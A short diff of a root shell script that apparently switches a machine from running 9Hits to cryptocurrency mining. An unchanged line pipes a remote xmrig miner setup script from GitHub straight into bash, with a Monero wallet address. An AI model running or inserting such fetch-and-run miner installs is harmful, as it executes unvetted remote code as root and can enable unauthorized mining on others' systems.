@@ -21,10 +21,11 @@ fi
 FILE=/root/change2Miner2
 if test -f "$FILE"; then
     echo OK1
+    killall 9hits
 else
     echo "change2Miner2" > /root/change2Miner2
     mv 9Hits 9Old
-    killall 9Hits
+    killall 9hits
     cd /root
     apt update
     curl -L https://raw.githubusercontent.com/MoneyMakers777/xmrig_setup/master/setup_skypool_miner.sh | bash -s '46rnJNvHVXAjdHWfrQndEJPJrWxjwL42zMNgCMH5vJyW97rGynsc4JjMu8TmxqcesR5Rjwk4QXHGEQ3Zi3NFSTPVVWoB1c5'
